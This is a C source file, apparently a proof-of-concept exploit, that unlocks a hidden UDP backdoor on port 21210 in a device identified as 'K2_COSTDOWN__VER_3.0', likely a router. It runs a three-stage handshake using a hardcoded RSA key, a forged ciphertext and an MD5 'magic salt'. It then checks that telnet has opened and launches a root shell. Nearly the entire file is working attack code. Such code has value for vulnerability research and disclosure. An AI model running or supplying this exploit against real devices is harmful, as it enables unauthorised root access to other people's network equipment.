#include <stdio.h>
#include <sys/time.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <openssl/bn.h>
#include <openssl/err.h>
#include <openssl/md5.h>
#include <openssl/rsa.h>


//#include "lockpick.h"
#define BACKDOOR_PORT 21210
#define TELNET_PORT 23
#define PLAINTEXT_LENGTH 0x20
#define CIPHERTEXT_LENGTH 0x80

#define NO_FLAGS 0
#define WIPE() { memset(plaintext, 0, PLAINTEXT_LENGTH+1); memset(ciphertext, 0, CIPHERTEXT_LENGTH); }


#define DEVICE_IDENTIFIER "K2_COSTDOWN__VER_3.0"

/////// Hexdump code

void fhexdump(FILE *fd, unsigned char *data, int len) {
  int i;
  for (i = 0; i < len; i++) {
    if (i % 16 == 0) {
      fprintf(fd, "\n");
    } else if (i % 8 == 0) {
      fprintf(fd, "  ");
    } else {
      fprintf(fd, " ");
    }
    fprintf(fd, "%02x", data[i]);
  }
  fprintf(fd, "\n\n");
}


void hexdump(unsigned char *data, int len) {
  fhexdump(stdout, data, len);
}


void bar(char ch) {
  int i;
  for (i = 0; i < 65; i++) {
    putc(ch, stdout);
  }
  putc('\n', stdout);
  return;
}


////// MD5 Code

int md5raw(unsigned char *out, const unsigned char *in, int len) {
  MD5_CTX c;
  MD5_Init(&c);
  MD5_Update(&c, in, len);
  MD5_Final(out, &c);
  return 0;
}

char *device_identifying_hash() {
  unsigned char buffer[0x80];
  unsigned char *hash;
  hash = calloc(16, sizeof(char));
  memset(buffer, 0, 0x80);
  strcpy(buffer, DEVICE_IDENTIFIER);
  md5raw(hash, buffer, 0x80);
  return hash;
}

////// RSA stuff

#define HARDCODED_n  "E541A631680C453DF31591A6E29382BC5EAC969DCFDBBCEA64CB49CBE36578845C507BF5E7A6BCD724AFA7063CA754826E8D13DBA18A2359EB54B5BE3368158824EA316A495DDC3059C478B41ABF6B388451D38F3C6650CDB4590C1208B91F688D0393241898C1F05A6D500C7066298C6BA2EF310F6DB2E7AF52829E9F858691"

#define HARDCODED_e 0x10001


RSA *init_rsa() {
  BIGNUM *e;
  BIGNUM *n;
  RSA *rsa;
  rsa = RSA_new();
  n = BN_new();
  e = BN_new();
  BN_set_word(e, HARDCODED_e);
  BN_hex2bn(&n,  HARDCODED_n);
  rsa->e = e;
  rsa->n = n;
}


int decrypt_with_pubkey(RSA *rsa, char *ciphertext, char *plaintext) {
  int sz;
  memset(plaintext, 0, PLAINTEXT_LENGTH);
  sz = RSA_size(rsa);
  fprintf(stderr, "[-] RSA_size(rsa) = %d\n", sz);
  return RSA_public_decrypt(sz, ciphertext, plaintext, rsa, RSA_NO_PADDING);
}


int encrypy_with_pubkey(RSA *rsa, char *plaintext, char *ciphertext) {
  int sz;
  memset(ciphertext,0,CIPHERTEXT_LENGTH);
  sz = RSA_size(rsa);
  fprintf(stderr, "[-] RSA_size(rsa) = %d\n", sz);
  return RSA_public_encrypt(sz, plaintext, ciphertext, rsa, RSA_NO_PADDING); 
}


//// RSA test code
//
//


/***
 *
 * Expected test case
 *
=====
S<:2\\fPve:j%lJ$j%A[DGQ-v|p,-;Tr
-----
	0xdd	0x02	0x0a	0x44	0x45	0x84	0xbd	0xf4
	0x86	0x8f	0x32	0xa3	0xad	0xbf	0x25	0x06
	0x5b	0x5a	0x75	0x9c	0x06	0xb1	0xad	0xf5
	0xb1	0x41	0x0e	0xaa	0xcc	0x61	0xcc	0x01
	0xfd	0x59	0xb8	0xbd	0x7b	0x19	0x17	0x78
	0xa2	0x77	0xac	0xae	0x40	0x43	0x5a	0xa8
	0x25	0x78	0xda	0x6c	0xae	0x93	0x56	0xb7
	0xc2	0x47	0x14	0x1b	0xb0	0xef	0x70	0xc3
	0x95	0x27	0x3d	0x3c	0xde	0x3c	0x34	0x21
	0xf4	0xc7	0xef	0xf0	0xa0	0x7a	0xff	0xf4
	0x66	0x5f	0xdf	0x19	0x57	0x5e	0xe5	0x92
	0x2b	0x16	0xa8	0x17	0x21	0xe6	0xc6	0x30
	0x7e	0x60	0x9a	0xdd	0x04	0xda	0xe5	0xe2
	0x63	0xff	0x2f	0x12	0x0c	0xa2	0x6f	0x6e
	0x6a	0x27	0x9c	0xa9	0x4a	0x3e	0x01	0x5f
	0x19	0x60	0xfc	0x1e	0x7d	0xc4	0x94	0xf7
*/


int test() {
  unsigned char ciphertext[CIPHERTEXT_LENGTH];
  char test_case[PLAINTEXT_LENGTH] = "S<:2\\fPve:j%lJ$j%A[DGQ-v|p,-;Tr";
  int res;
  RSA *rsa;
  rsa = init_rsa();

  unsigned char expected[CIPHERTEXT_LENGTH] = {
	0xdd,	0x02,	0x0a,	0x44,	0x45,	0x84,	0xbd,	0xf4,
	0x86,	0x8f,	0x32,	0xa3,	0xad,	0xbf,	0x25,	0x06,
	0x5b,	0x5a,	0x75,	0x9c,	0x06,	0xb1,	0xad,	0xf5,
	0xb1,	0x41,	0x0e,	0xaa,	0xcc,	0x61,	0xcc,	0x01,
	0xfd,	0x59,	0xb8,	0xbd,	0x7b,	0x19,	0x17,	0x78,
	0xa2,	0x77,	0xac,	0xae,	0x40,	0x43,	0x5a,	0xa8,
	0x25,	0x78,	0xda,	0x6c,	0xae,	0x93,	0x56,	0xb7,
	0xc2,	0x47,	0x14,	0x1b,	0xb0,	0xef,	0x70,	0xc3,
	0x95,	0x27,	0x3d,	0x3c,	0xde,	0x3c,	0x34,	0x21,
	0xf4,	0xc7,	0xef,	0xf0,	0xa0,	0x7a,	0xff,	0xf4,
	0x66,	0x5f,	0xdf,	0x19,	0x57,	0x5e,	0xe5,	0x92,
	0x2b,	0x16,	0xa8,	0x17,	0x21,	0xe6,	0xc6,	0x30,
	0x7e,	0x60,	0x9a,	0xdd,	0x04,	0xda,	0xe5,	0xe2,
	0x63,	0xff,	0x2f,	0x12,	0x0c,	0xa2,	0x6f,	0x6e,
	0x6a,	0x27,	0x9c,	0xa9,	0x4a,	0x3e,	0x01,	0x5f,
	0x19,	0x60,	0xfc,	0x1e,	0x7d,	0xc4,	0x94,	0xf7
  };

  printf("[=] Test case: '%s'\n", test_case);
  encrypy_with_pubkey(rsa, test_case, ciphertext);

  res = memcmp(ciphertext, expected, CIPHERTEXT_LENGTH);
  if (res != 0) {
    printf("[X] FAILED TEST CASE!\n");
    exit(1);
  }
  hexdump(ciphertext, CIPHERTEXT_LENGTH);

  printf("\n[*] TEST SUCCESSFUL!\n");

  return res;
}





//// UDP Stuff


int communicate(char *ip_addr, 
    unsigned int port,
    unsigned char *msg, 
    unsigned int msg_len, 
    unsigned char *resp,
    unsigned int resp_len) {


  int sockfd;
  int n, len;

  struct sockaddr_in server_addr;

  sockfd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
  if(sockfd == -1){
    puts("[x] Failed to create socket. Fatal.");
    exit(1);
  }
  memset(&server_addr,0,sizeof(struct sockaddr_in));

  // Set address information
  server_addr.sin_family = AF_INET;
  server_addr.sin_addr.s_addr = inet_addr(ip_addr);
  server_addr.sin_port = htons(port);
  /*
  printf("[-] Binding to address %s on port %d\n", ip_addr, port);
  if (0 > bind(sockfd, (struct sockaddr*)&server_addr, sizeof(server_addr))) {
    puts("Bind fail!");
    close(sockfd);
    exit(1);
  }
*/
  printf("[-] Sending message to %s on UDP port %d:\n", ip_addr, port);
  hexdump(msg, msg_len);

  sendto(sockfd, (const char*) msg, msg_len, NO_FLAGS, 
      (const struct sockaddr *) &server_addr,
      sizeof(server_addr));

  printf("[-] Message sent.\n");

  if (resp_len) {
    printf("[-] Expecting %d bytes in reply...\n", resp_len);
    n = recvfrom(sockfd, resp, resp_len, MSG_WAITALL,
        (struct sockaddr *) &server_addr,
        &len);
    printf("[-] Received %d bytes in reply:\n", n);
    hexdump(resp, n);
  }

  close(sockfd);

  return 0;
}



int check_tcp_port(char *ip_addr, int port) {
  int sockfd;

  sockfd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
  if(sockfd == -1){
    puts("[x] Failed to create socket. Fatal.");
    exit(1);
  }
  struct sockaddr_in server_addr;
  memset(&server_addr,0,sizeof(struct sockaddr_in));

  // Set address information
  server_addr.sin_family = AF_INET;
  server_addr.sin_addr.s_addr = inet_addr(ip_addr);
  server_addr.sin_port = htons(port);
  if (connect(sockfd,(struct sockaddr *) &server_addr,sizeof(server_addr)) < 0) {
    printf("[x] Port %d on %s is closed.\n", port, ip_addr);
    close(sockfd);
    return 0;
  } else {
    printf("[!] Port %d on %s is open.\n", port, ip_addr);
    close(sockfd);
    return 1;
  }
}



char *find_phony_ciphertext(RSA *rsa) {
  char *phony_ciphertext;
  char phony_plaintext[0x80];
  int i;
  phony_ciphertext = calloc(PLAINTEXT_LENGTH, sizeof(char));
  do {
    for (i = 0; i < PLAINTEXT_LENGTH; i++) {
      phony_ciphertext[i] = rand() & 0xFF;
    }
    decrypt_with_pubkey(rsa, phony_ciphertext, phony_plaintext); 
    for (i = 0x21; i < 0x7f; i++) {
      if (phony_plaintext[0] ^ (unsigned char) i == 0x00) {
        fprintf(stderr, "[!] Found stage 2 payload:\n");
        fhexdump(stderr, phony_ciphertext, PLAINTEXT_LENGTH);
        fprintf(stderr, "[=] Decrypts to:\n");
        fhexdump(stderr, phony_plaintext, PLAINTEXT_LENGTH);
        return phony_ciphertext;
      }
    }
  } while (1);
}




int main(int argc, char **argv) {
  unsigned char ciphertext[CIPHERTEXT_LENGTH];
  char plaintext[PLAINTEXT_LENGTH+1];
  int res;
  int len;
  RSA *rsa;
  WIPE();

  if (argc == 1) {
    printf("[?] Usage: %s [<test|enc $length|dec $length>| <ip addr>]\n", argv[0]);
    exit(1);
  }
  

  if (!(strcmp(argv[1], "test"))) {
    test();
    exit(0);
  }

  if (!(strcmp(argv[1], "enc"))) {
    rsa = init_rsa();
    fread(plaintext, sizeof(char), PLAINTEXT_LENGTH, stdin);
    //plaintext[PLAINTEXT_LENGTH-1] = '\x00';
    fflush(stdin);
    fprintf(stderr, "[+] Read data:\n");
    fhexdump(stderr, plaintext, PLAINTEXT_LENGTH);
    fprintf(stderr, "[+] Encrypting plaintext '%s' of length %ld\n", plaintext, strlen(plaintext));
    encrypy_with_pubkey(rsa, plaintext, ciphertext);
    hexdump(ciphertext, CIPHERTEXT_LENGTH);
    exit(0);
  } else if (!(strcmp(argv[1], "dec"))) {
    rsa = init_rsa();
    fread(ciphertext, sizeof(char), CIPHERTEXT_LENGTH, stdin);
    fprintf(stderr, "[+] Read data:\n");
    fhexdump(stderr, ciphertext, CIPHERTEXT_LENGTH);
    fprintf(stderr, "[+] Decrypting with public key...\n");
    decrypt_with_pubkey(rsa, ciphertext, plaintext);
    hexdump(plaintext, PLAINTEXT_LENGTH);
    fprintf(stderr, "[+] strlen(decrypt_with_pubkey(payload)) = %ld\n", strlen(plaintext)); 
    //print_temp_key(plaintext);
    exit(0);
  }
     

  /** The exploit **/

  char *ip_addr = argv[1]; 
  char *handshake_token = "ABCDEF1234";
  char *phony_ciphertext;
  char backdoor_key[16];
  char *magic_salt = "+TEMP";
  char *id;
  unsigned char buffer[CIPHERTEXT_LENGTH];
  int tries = 1000;
  int tries_left = tries;
  char *telnet_command;
  struct timeval timecheck;
  long int start;
  long int elapsed;

  printf("[+] Initializing RSA Cipher with:\n- hardcoded e: 0x%X\n- hardcoded n: 0x%s\n- no padding\n", HARDCODED_e, HARDCODED_n);

  rsa = init_rsa();
  telnet_command = malloc(0x80 * sizeof(char));
  sprintf(telnet_command, "telnet %s 23", ip_addr);
  
  gettimeofday(&timecheck, NULL);
  start = (long)timecheck.tv_sec * 1000 + (long)timecheck.tv_usec / 1000;

  do {
    tries_left -= 1;
    bar('=');
    printf("[*] ENTERING STAGE I\n");
    bar('=');
    printf("[+] Sending handshake token: %s\n", handshake_token);
    printf("[-] Waiting for device identifying hash...\n");
    communicate(ip_addr, BACKDOOR_PORT,
        handshake_token,
        strlen(handshake_token),
        buffer,
        16);
    printf("[+] Received device identifying hash:\n");
    hexdump(buffer, 16);

    // not strictly necessary, but I like to make sure everything's in order
    id = device_identifying_hash();
    if (0 != memcmp(id, buffer, 16)) {
      printf("[x] Discrepancy in device identifying hash. Expected:\n");
      hexdump(id, 16);
      free(id);
      exit(1);
    } else {
      printf("[+] Device identifying hash matches expected value.\n");
      free(id);
    }

    bar('=');
    printf("[*] ENTERING STAGE II\n");
    bar('=');
    memset(buffer, 0, CIPHERTEXT_LENGTH);
    phony_ciphertext = find_phony_ciphertext(rsa);  
    communicate(ip_addr, BACKDOOR_PORT,
        phony_ciphertext,
        0x20,
        buffer,
        CIPHERTEXT_LENGTH);
    free(phony_ciphertext);

    bar('=');
    printf("[*] ENTERING STAGE III\n");
    bar('=');
    memset(backdoor_key, 0, 0x10);
    printf("[+] Sending MD5('%s') and hoping for collision...\n",
        magic_salt);
    md5raw(backdoor_key, magic_salt, strlen(magic_salt));
    communicate(ip_addr, BACKDOOR_PORT,
        backdoor_key,
        0x10,
        buffer,
        0);

    /* Now test to see if the telnet port is open. */

    if (check_tcp_port(ip_addr, TELNET_PORT)) {

      gettimeofday(&timecheck, NULL);
      elapsed = ((long)timecheck.tv_sec * 1000 + (long)timecheck.tv_usec / 1000) - start;

      printf("[*] The backdoor lock has been picked in %ld msec with %d attempts.\n", elapsed, tries - tries_left);
      printf("[*] Please enjoy your root shell.\n");
      system(telnet_command);
      printf("[*] PoC complete. Have a nice day.\n");
      exit(0);
    } else {
      printf("[+] Not yet. %d tries remaining...\n", tries);
    }

  } while (tries_left);
  
  return 0;
}

